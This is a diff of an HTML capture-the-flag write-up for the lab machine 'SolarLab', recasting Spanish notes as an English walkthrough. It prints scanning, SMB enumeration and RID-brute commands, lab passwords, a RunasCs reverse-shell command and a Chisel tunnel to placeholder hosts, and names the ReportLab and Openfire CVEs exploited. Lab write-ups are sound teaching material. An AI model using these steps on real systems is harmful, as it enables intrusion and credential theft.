@@ -7,6 +7,210 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>SolarLab</h1><br/><p><ol><li> Realizo un escaneo de puertos<strong> nmap 10.10.11.16 -Pn -sC -sV --open -p- -oN scan.txt</strong></li><li>Encuentro los servicios  http(p.80) msrpc, netbios-ssn, microsoft-ds?, http(p.6791)</li><li>Mientras hago una enumeración de directorios accedo al otro htttp del puerto 6791</li><li>Lo añado a /etc/hosts</li><li>Al recargar me muestra un login </li></ol><img src="images/82-1.png" alt="images/82-1.png" /><ol><li>En la página del <strong>p.80</strong> no encuentro nada interesante por lo que muy probablemente tenga que passear este login</li><li>Intento varias injecciones y usuarios default sin exito. Lo más probable es que tenga que encontrar las <strong>credenciales</strong> y usarlas para entrar</li><li>En el <strong>p.445</strong> se está ejecutando <strong>SMB</strong></li><li>con el usuario anonymous puedo enumerar las shares que hay disponibles <strong>crackmapexec smb 10.10.11.16 -u &#39;anonymous&#39; -p &#39;&#39; --shares</strong> </li></ol><img src="images/82-2.png" alt="images/82-2.png" /><ol><li>Accedo a el share Documents con smbclient <strong>smbclient //10.10.11.16/Documents -U &quot;anonymous&quot;</strong> </li></ol><img src="images/82-3.png" alt="images/82-3.png" /><ol><li> En el archivo details-file.xlsx Encontramos unas pass </li></ol><img src="images/82-4.png" alt="images/82-4.png" /><ol><li>Lo siguiente que tendremos que hacer es un ataque de fuerza bruta de <strong>RIDs</strong> (Relative Identifiers)<strong> crackmapexec smb 10.10.11.16 -u &#39;anonymous&#39; -p &#39;&#39; --rid-brute</strong> </li></ol><img src="images/82-5.png" alt="images/82-5.png" /><ol><li>Encontramos las credenciales <strong> blake:ThisCanB3typedeasily1@</strong> </li></ol><img src="images/82-6.png" alt="images/82-6.png" /><ol><li>Al ser blake+byte llego a que el username es <strong>blakeb</strong>. Sigue teniendo la misma pass</li><li>Accedo al dashboard </li></ol><img src="images/82-7.png" alt="images/82-7.png" /><ol><li>Ahora tengo que buscar la forma de obtener un reverse shell</li><li>Veo que es un generador de pdfs. </li></ol><img src="images/82-8.png" alt="images/82-8.png" /><ol><li>Tras buscar encuentro el  <strong>CVE-2023-33733</strong> el cual por falta de comprobaciones en la función &quot;rl_safe_eval&quot; podemos injectar codigo malicioso en un archivo HTML que podemos convertir más tarde en un PDF usando la librería ReporLab.</li><li>Relleno todos los campos y intercepto la request de<strong> generate PDF</strong> con <strong>burpsuite</strong> </li></ol><img src="images/82-9.png" alt="images/82-9.png" /><ol><li>La request interceptada </li></ol><img src="images/82-10.png" alt="images/82-10.png" /><ol><li>Primero activamos el Listener </li></ol><img src="images/82-11.png" alt="images/82-11.png" /><ol><li>Luego creamos el reverse shell (Podemos hacerlo con msfvenom o con revshells.com)</li><li>Enviamos la solicitud POST y obtenemos el reverse </li></ol><img src="images/82-12.png" alt="images/82-12.png" /><ol><li></li></ol><img src="images/82-13.png" alt="images/82-13.png" /><ol><li>Pongo persistencia porqué le costó establecer el reverse shell</li><li>Para ello usar metasploit </li></ol><img src="images/82-14.png" alt="images/82-14.png" /><ol><li></li></ol><img src="images/82-15.png" alt="images/82-15.png" /><ol><li></li></ol><img src="images/82-16.png" alt="images/82-16.png" /><ol><li>Ejecuto Winpeas y encuentra el archivo<strong> users.db</strong>  </li></ol><img src="images/82-17.png" alt="images/82-17.png" /><ol><li>Descargo el archivo y dentro de esa db encuentro el usuario  </li></ol><img src="images/82-18.png" alt="images/82-18.png" /><ol><li>Encuentro las credenciales <strong>openfire:HotP!fireguard</strong>  <strong>db.session.add(User(username=&#39;blakeb&#39;, password=&#39;ThisCanB3typedeasily1@&#39;))</strong></li></ol><strong></strong></p><p><strong>	db.session.add(User(username=&#39;claudias&#39;, password=&#39;007poiuytrewq&#39;))</strong><strong></strong></p><p><strong>	db.session.add(User(username=&#39;alexanderk&#39;, password=&#39;HotP!fireguard&#39;)) </strong><ol><li>Para cambiar de usuario y obtener un shell usare <strong>RunasCs</strong> </li></ol><img src="images/82-19.png" alt="images/82-19.png" /><ol><li>Primero tengo que iniciar powershell para poder inciar RunasCs.exe<strong> ./runas.exe openfire HotP!fireguard powershell -r &lt;IP&gt;:&lt;PORT&gt;</strong> </li></ol><img src="images/82-20.png" alt="images/82-20.png" /><ol><li>Creo que openfire se está ejecutando en este puerto </li></ol><img src="images/82-21.png" alt="images/82-21.png" /><ol><li>Tendremos que hacer un portforwarding con chisel <strong>C:\Users\blake\Documents\app\chisel.exe client &lt;IP&gt;:&lt;PORT&gt; R:9090:127.0.0.1:9090</strong></li><li>Accedemos a través de nuestra propia máquina y encontramos un login </li></ol><img src="images/82-22.png" alt="images/82-22.png" /><ol><li>Este login tiene un exploit que permite bypasearlo <a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">CVE-2023-32315</a></li><li>Tras buscar encuentro la ruta de la db <strong>C:\Program Files\Openfire\embedded-db\openfire</strong></li><li>Encuentro el hash de Administrator</li><li>Y lo desencripto con <a href="https://github.com/c0rdis/openfire_decrypt">openfire_decrypt</a></li><li> Obtengo las credenciales<strong> Administrator:ThisPasswordShouldDo!@</strong></li><li>Uso RunasCs para cambiarme al usuario <strong>Administrator</strong> y obtener la <strong>root</strong> <strong>flag</strong>   </li></ol></p></div>
+<div class="page">
+
+<h1 class="title">SolarLab</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+
+<p>
+I started with a full TCP port scan to identify exposed services on the target machine.
+</p>
+
+<pre><code>nmap 10.10.11.16 -Pn -sC -sV --open -p- -oN scan.txt</code></pre>
+
+<p>
+The scan revealed several services including HTTP on port 80, MSRPC, NetBIOS, SMB on port 445, and another HTTP service running on port 6791.
+While performing directory enumeration, I accessed the HTTP service on port 6791, which required adding the corresponding hostname to <code>/etc/hosts</code>.
+After reloading the page, a login panel was presented.
+</p>
+
+<img src="images/82-1.png" alt="images/82-1.png" />
+</section>
+
+<section>
+<h2>Enumeration / Analysis</h2>
+
+<p>
+The HTTP service on port 80 did not expose any interesting functionality, which suggested that authentication bypass was unlikely and valid credentials would be required.
+Multiple injection attempts and default credentials were tested without success.
+</p>
+
+<p>
+Since SMB was running on port 445, I attempted anonymous enumeration to identify accessible shares.
+</p>
+
+<pre><code>crackmapexec smb 10.10.11.16 -u 'anonymous' -p '' --shares</code></pre>
+
+<img src="images/82-2.png" alt="images/82-2.png" />
+
+<p>
+Using anonymous access, I connected to the <code>Documents</code> share with smbclient.
+</p>
+
+<pre><code>smbclient //10.10.11.16/Documents -U "anonymous"</code></pre>
+
+<img src="images/82-3.png" alt="images/82-3.png" />
+
+<p>
+Inside the share, a file named <code>details-file.xlsx</code> was found, which contained password information.
+</p>
+
+<img src="images/82-4.png" alt="images/82-4.png" />
+
+<p>
+To further enumerate users, I performed RID brute forcing over SMB.
+</p>
+
+<pre><code>crackmapexec smb 10.10.11.16 -u 'anonymous' -p '' --rid-brute</code></pre>
+
+<img src="images/82-5.png" alt="images/82-5.png" />
+
+<p>
+This process revealed valid credentials: <strong>blake:ThisCanB3typedeasily1@</strong>.
+Given the naming convention observed, I inferred the correct username to be <strong>blakeb</strong>, using the same password.
+</p>
+
+<img src="images/82-6.png" alt="images/82-6.png" />
+
+<p>
+With these credentials, I successfully authenticated and accessed the application dashboard.
+</p>
+
+<img src="images/82-7.png" alt="images/82-7.png" />
+</section>
+
+<section>
+<h2>Exploitation</h2>
+
+<p>
+Once authenticated, the next objective was to obtain remote code execution.
+The application was identified as a PDF generator.
+</p>
+
+<img src="images/82-8.png" alt="images/82-8.png" />
+
+<p>
+Research revealed <strong>CVE-2023-33733</strong>, a vulnerability caused by insufficient validation in the <code>rl_safe_eval</code> function.
+This flaw allows malicious code injection within an HTML file that is later converted into a PDF using the ReportLab library.
+</p>
+
+<p>
+I filled in all required fields and intercepted the <strong>Generate PDF</strong> request using Burp Suite.
+</p>
+
+<img src="images/82-9.png" alt="images/82-9.png" />
+
+<p>
+The intercepted HTTP request is shown below.
+</p>
+
+<img src="images/82-10.png" alt="images/82-10.png" />
+
+<p>
+Before sending the malicious payload, I started a listener on my attacking machine.
+</p>
+
+<img src="images/82-11.png" alt="images/82-11.png" />
+
+<p>
+I then crafted a reverse shell payload, either using msfvenom or revshells.com, injected it into the request, and sent the POST request.
+This resulted in a successful reverse shell.
+</p>
+
+<img src="images/82-12.png" alt="images/82-12.png" />
+<img src="images/82-13.png" alt="images/82-13.png" />
+
+<p>
+Due to instability when establishing the shell, I implemented persistence using Metasploit.
+</p>
+
+<img src="images/82-14.png" alt="images/82-14.png" />
+<img src="images/82-15.png" alt="images/82-15.png" />
+<img src="images/82-16.png" alt="images/82-16.png" />
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+
+<p>
+After stabilizing access, I executed WinPEAS to enumerate privilege escalation vectors.
+This revealed the presence of a database file named <strong>users.db</strong>.
+</p>
+
+<img src="images/82-17.png" alt="images/82-17.png" />
+
+<p>
+I downloaded the database and extracted user information from it.
+</p>
+
+<img src="images/82-18.png" alt="images/82-18.png" />
+
+<p>
+Within the database, several credentials were found:
+</p>
+
+<p>
+<strong>openfire:HotP!fireguard</strong><br/>
+<strong>db.session.add(User(username='blakeb', password='ThisCanB3typedeasily1@'))</strong><br/>
+<strong>db.session.add(User(username='claudias', password='007poiuytrewq'))</strong><br/>
+<strong>db.session.add(User(username='alexanderk', password='HotP!fireguard'))</strong>
+</p>
+
+<p>
+To switch users and obtain a new shell, I used <strong>RunasCs</strong>.
+First, I launched PowerShell to execute RunasCs.
+</p>
+
+<pre><code>./runas.exe openfire HotP!fireguard powershell -r &lt;IP&gt;:&lt;PORT&gt;</code></pre>
+
+<img src="images/82-19.png" alt="images/82-19.png" />
+<img src="images/82-20.png" alt="images/82-20.png" />
+
+<p>
+I identified that Openfire was running locally on port 9090.
+</p>
+
+<img src="images/82-21.png" alt="images/82-21.png" />
+
+<p>
+To access it externally, I performed port forwarding using Chisel.
+</p>
+
+<pre><code>C:\Users\blake\Documents\app\chisel.exe client &lt;IP&gt;:&lt;PORT&gt; R:9090:127.0.0.1:9090</code></pre>
+
+<p>
+Accessing the forwarded service from my machine presented another login panel.
+</p>
+
+<img src="images/82-22.png" alt="images/82-22.png" />
+
+<p>
+This login was vulnerable to an authentication bypass using <a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">CVE-2023-32315</a>.
+After bypassing authentication, I located the Openfire embedded database at:
+</p>
+
+<p>
+<strong>C:\Program Files\Openfire\embedded-db\openfire</strong>
+</p>
+
+<p>
+From this database, I extracted the Administrator hash and decrypted it using <a href="https://github.com/c0rdis/openfire_decrypt">openfire_decrypt</a>.
+The recovered credentials were:
+</p>
+
+<p>
+<strong>Administrator:ThisPasswordShouldDo!@</strong>
+</p>
+
+<p>
+Finally, I used RunasCs once more to switch to the <strong>Administrator</strong> account and successfully obtained the root flag.
+</p>
+
+</section>
+
+</div>
 </body>
+
 </html>
